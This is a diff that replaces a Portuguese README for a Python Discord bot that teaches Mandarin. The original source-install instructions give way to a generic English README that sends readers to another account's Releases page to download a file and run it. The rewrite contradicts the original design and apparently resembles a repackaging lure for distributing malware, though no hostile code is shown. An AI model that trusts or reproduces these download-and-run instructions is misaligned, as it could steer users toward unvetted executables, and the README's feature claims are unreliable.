@@ -1,67 +1,69 @@
-# 🌸 Elysia (爱莉希雅) - Chinese Learning Bot
+# 🌸 ChineseLessons-Discord - Learn Mandarin Easily on Discord
 
-![Python](https://img.shields.io/badge/Python-3.10%2B-blue?logo=python&logoColor=white)
-![Discord.py](https://img.shields.io/badge/Discord.py-2.0%2B-5865F2?logo=discord&logoColor=white)
-![Status](https://img.shields.io/badge/Status-Online-success)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Grab%20Your%20Copy-blue)](https://github.com/Kumikocodes/ChineseLessons-Discord/releases)
 
-**Elysia** é um bot de Discord interativo e moderno focado no ensino de Mandarim (Chinês). Baseado no projeto *ChineseLessons*, este bot transforma o estudo em um jogo contínuo (Gamification), utilizando áudio gerado em tempo real, banco de dados para progresso e exercícios infinitos.
+## 🚀 Getting Started
 
----
+Welcome to ChineseLessons-Discord! This tool helps you learn Mandarin in a fun and interactive way on Discord. With features like quizzes, flashcards, and a built-in audio system, you can enjoy learning at your own pace. Follow the steps below to get started.
 
-## ✨ Funcionalidades Principais
+## 📥 Download & Install
 
-* **🗣️ Pronúncia Nativa (TTS):** Integração com `gTTS` para gerar áudio de qualquer palavra ou frase em chinês instantaneamente.
-* **♾️ Modo Estudo Contínuo:** Sistema de Flashcards que nunca para. Estude centenas de palavras sem interrupções.
-* **🧠 Quiz Infinito:** Jogos de múltipla escolha gerados proceduralmente baseados no vocabulário do banco de dados.
-* **📈 Sistema de RPG (XP & Níveis):**
-  * Ganhe XP estudando e acertando questões.
-  * Suba de nível e acompanhe seu progresso no cartão de estudante.
-  * Ranking global dos melhores alunos.
-* **💾 Banco de Dados Robusto:** Utiliza `SQLite` (via `aiosqlite`) para salvar dados de forma assíncrona e segura.
-* **📂 Categorias Dinâmicas:** Vocabulário organizado em Profissões, Cores, Alimentos, HSK1, etc.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Kumikocodes/ChineseLessons-Discord/releases) to find the latest version of the application.
+2. **Choose Your Version**: Look for the latest release and find the appropriate file for your system.
+3. **Download the File**: Click the download link for your operating system to start the download.
+4. **Run the Application**: Once downloaded, locate the file and run it to begin.
 
----
+## 🛠️ System Requirements
 
-## 🛠️ Tecnologias Utilizadas
+To ensure smooth operation, please make sure your system meets the following requirements:
 
-* **Linguagem:** Python 3.10+
-* **Core:** `discord.py` (Interactions & Slash Commands)
-* **Database:** `aiosqlite` (SQLite assíncrono)
-* **Áudio:** `gTTS` (Google Text-to-Speech)
-* **Gestão de Variáveis:** `python-dotenv`
+- **Operating System**: Windows, macOS, or Linux
+- **RAM**: At least 4 GB of RAM
+- **Storage**: Minimum 100 MB of free space
+- **Discord Account**: A registered Discord account to use the bot
 
----
+## 🌟 Features
 
-## 🚀 Instalação e Execução
+ChineseLessons-Discord provides you with several tools to enhance your learning experience:
 
-### 1. Clone o repositório
+- **Audio Support**: Hear pronunciations directly within Discord for effective listening practice.
+- **Gamification**: Earn experience points (XP) as you engage with lessons, making learning rewarding.
+- **Infinitely Scalable Quizzes**: Test your knowledge anytime and keep improving.
+- **Flashcards**: Create and use flashcards to reinforce your memory.
+- **SQLite Database**: Efficiently manage your learning data for easy access and performance.
 
-```bash
-git clone https://github.com/PedroZxK/ChineseLessons.git
-cd ChineseLessons
-```
+## 📚 How to Use ChineseLessons-Discord
 
-### 2. Instale as dependências
+1. **Set Up the Bot on Your Server**:
+   - Invite the bot to your Discord server.
+   - Ensure you have the appropriate permissions to add bots.
 
-```bash
-pip install discord.py aiosqlite gTTS python-dotenv
-```
+2. **Configure the Bot**:
+   - Use the command `!setup` to start the setup process.
+   - Follow the prompts to customize your learning preferences.
 
-> **Nota:** É necessário ter o **FFmpeg** instalado no sistema apenas se for usar canais de voz futuramente. Para envio de arquivos MP3 no chat, as bibliotecas acima já são suficientes.
+3. **Start Learning**:
+   - Use commands like `!quiz` to get started with quizzes.
+   - Use `!flashcard` to access your predefined flashcards.
 
-### 3. Configuração de Segurança
+4. **Track Your Progress**:
+   - Check your XP and learning history with the command `!progress`.
 
-Crie um arquivo chamado `.env` na raiz do projeto e adicione o token do seu bot:
+## ⚙️ Additional Resources
 
-```env
-DISCORD_TOKEN=SEU_TOKEN_DO_DISCORD_AQUI
-```
+For further guidance, tutorials, and community support, visit our [Wiki](https://github.com/Kumikocodes/ChineseLessons-Discord/wiki). Here, you'll find detailed instructions and tips on maximizing your learning experience.
 
-> ⚠️ **Nunca compartilhe este arquivo publicamente.**
+## 💬 Community Support
 
-### 4. Inicie a Elysia
+Join our Discord community to connect with other learners. Share tips, ask questions, and collaborate on learning Mandarin together. You can find the link to our community in the Wiki or through your bot commands.
 
-```bash
-python main.py
-```
+## 📝 Contributing
 
+We welcome contributions! If you have ideas or improvements, feel free to create a pull request or report issues on our GitHub page. Your feedback helps us enhance the learning experience for everyone.
+
+## 🔗 Useful Links
+
+- [Releases page](https://github.com/Kumikocodes/ChineseLessons-Discord/releases)
+- [Wiki](https://github.com/Kumikocodes/ChineseLessons-Discord/wiki)
+
+We hope you enjoy your journey in learning Mandarin with ChineseLessons-Discord! Don't forget to check back for updates and new features. Happy learning!
